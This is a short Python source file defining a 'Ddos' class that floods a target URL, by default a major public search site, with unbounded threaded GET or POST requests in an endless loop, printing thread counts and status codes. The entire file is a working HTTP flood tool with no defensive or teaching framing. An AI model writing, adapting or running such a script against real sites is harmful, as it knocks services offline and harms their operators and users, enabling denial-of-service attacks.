from threading import Thread
import signal
import requests

class Ddos:
	def __init__(self, url='https://www.baidu.com', methodId=0, maxThread=100, headers={}, getParam={}, postData={}):
		self.runningThread = 0
		self.status_code = 0

		self.setUrl(url)
		self.setMethod(methodId)
		self.setMaxThread(maxThread)

		self.setHeaders(headers)
		self.setGetParam(getParam)
		self.setPostData(postData)

	def start(self):
		# 监听ctrl+c中断信号
		signal.signal(signal.SIGINT, exit)
		signal.signal(signal.SIGTERM, exit)

		while True:
			if self.runningThread < self.maxThread:
				t = Thread(target=self.attack)
				t.setDaemon(False)
				t.start()
				self.flush()

	def attack(self):
		self.runningThread += 1

		if self.methodId == 0:
			res = requests.get(self.url, params=self.getParam, headers=self.headers)
		elif self.methodId == 1:
			res = requests.post(self.url, data=self.postData)
		
		self.status_code = res.status_code

		self.runningThread -= 1

	def flush(self):
		print('Threads: ', self.runningThread, ' StatusCode: ', self.status_code)

	def setUrl(self, url):
		self.url = url

	def setMethod(self, methodId):
		# 0:get; 1:post
		self.methodId = methodId

	def setMaxThread(self, maxThread):
		self.maxThread = maxThread

	def setHeaders(self, headers):
		self.headers = headers

	def setGetParam(self, getParam):
		self.getParam = getParam

	def setPostData(self, postData):
		self.postData = postData
